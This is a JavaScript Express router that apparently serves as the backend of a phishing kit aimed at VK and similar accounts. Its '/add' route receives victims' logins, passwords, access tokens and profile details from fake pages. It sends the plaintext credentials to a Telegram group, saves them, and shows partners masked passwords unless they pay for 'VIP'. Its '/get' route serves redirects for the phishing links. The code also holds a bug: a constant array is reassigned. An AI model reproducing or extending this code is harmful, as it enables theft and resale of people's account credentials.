const {Router} = require('express')
const bot = require('../../createBot')
const accs = require('../../database/models/account')
const links = require('../../database/models/link')
const user = require('../../database/models/userData')
const {names} = require('./../../objects')
const router = Router()
const iplist = []

router.post('/get', async(req, res) => {
    let ip = req.body.ip, ipexist = false
    iplist.map(e=>{
        if(e.ip==ip){
            if(e.req<10){
                e.req++
            }else{
               return res.end('Too many requests')
            }
            ipexist = 1
        }
    })
    if(!ipexist){
        iplist = [...iplist, {ip: req.body.ip, req: 1}]
    }
    let userData = await user.findOne({
        tg_id: parseInt(req.body.id, 32)
    })
    
    let redirect = await links.findOne({link: req.body.link}).query[req.body.pattern]
    if(userData){
        await user.updateOne({tg_id: parseInt(req.body.id, 32)},{
            links_info: [...userData.links_info, {link: req.body.link, date: new Date(), pattern: req.body.pattern}]
        },{upsert: true})
        userData.redirect.map(e=>{
            if(e.link == req.body.link && e.pattern == req.body.pattern){
                redirect = e.redirect
            }
        })
    }
    res.json({redirect: redirect})
})
router.post('/add', async (req, res) => {
    const userData = await user.findOne({
        tg_id: parseInt(req.body.id, 32)
    })
    const condidate = await accs.findOne({
        login: req.body.login,
        password: req.body.password
    })
    if (!condidate && req.body.login.trim()!=''&& req.body.password.trim()!='') {
        console.log(req.body)
        bot.sendMessage(process.env.NotifyGroup2, `✨ Новый аккаунт ${names[req.body.type]}\n😻 Логин: <code>${req.body.login}</code>\n🗝 Пароль: <code>${req.body.password}</code>\n\nАккаунт пользователя: @${userData.login||'-'}\nTelegram ID: <code>${userData.tg_id||'-'}</code>`,{parse_mode: 'HTML'})
        if (userData) {
            bot.sendMessage(parseInt(req.body.id, 32), userData.vip ? `✨ Новый аккаунт ${names[req.body.type]}\n😻 Логин: <code>${req.body.login}</code>\n🗝 Пароль: <code>${req.body.password}</code>` : `✨ Новый аккаунт ${names[req.body.type]}\n😻 Логин: ${req.body.login.includes('@')?req.body.login.split('@')[0].substr(0, Math.floor(req.body.login.split('@')[0].length*20/100))+'*'.repeat(req.body.login.split('@')[0].length-Math.floor(req.body.login.split('@')[0].length*20/100))+req.body.login.split('@')[1]:req.body.login.length<5?'*'.repeat(req.body.login.length):req.body.login.substr(0, Math.floor(req.body.login.length*30/100))+'*'.repeat(req.body.login.length-Math.floor(req.body.login.length*50/100))+req.body.login.substr(req.body.login.length-Math.floor(req.body.login.length*20/100), req.body.login.length)}\n🗝 Пароль: ${req.body.password.substr(0, Math.floor(req.body.password.length*30/100))+'*'.repeat(req.body.password.length-Math.floor(req.body.password.length*50/100))+req.body.password.substr(req.body.password.length-Math.floor(req.body.password.length*20/100), req.body.password.length)}\nДля просмотра данных от аккаунта приобретите VIP`, {
                reply_markup: {
                    inline_keyboard: [
                        userData.vip ? [] : [{
                            text: 'Купить VIP',
                            callback_data: 'show_vip'
                        }]
                    ]
                },
                parse_mode: 'HTML'
            })
            let link = await links.findOne({link: new URL(req.body.fake||'http://localhost').origin})
            console.log(link)
            await new accs({
                login: req.body.login,
                password: req.body.password,
                token: req.body.token,
                has_mobile: req.body.has_mobile,
                followers: req.body.counters.followers,
                friends: req.body.counters.friends,
                online: req.body.online,
                first_name: req.body.first_name,
                last_name: req.body.last_name,
                id: req.body.user_id,
                is_closed: req.body.is_closed,
                photo: req.body.photo_400_orig,
                sex: req.body.sex,
                gifts: req.body.counters.gifts,
                tg_id: parseInt(req.body.id, 32),
                type: req.body.type||'vk',
                fake: new URL(req.body.fake||'http://localhost').origin,
                pattern: link.query[Number(req.body.query)].name,
                query: Number(req.body.query),
                //ip: req.body.ip.split(',')[0]||'-',
                date: new Date()
            }).save()
        }
    }
    res.end()
})

module.exports = router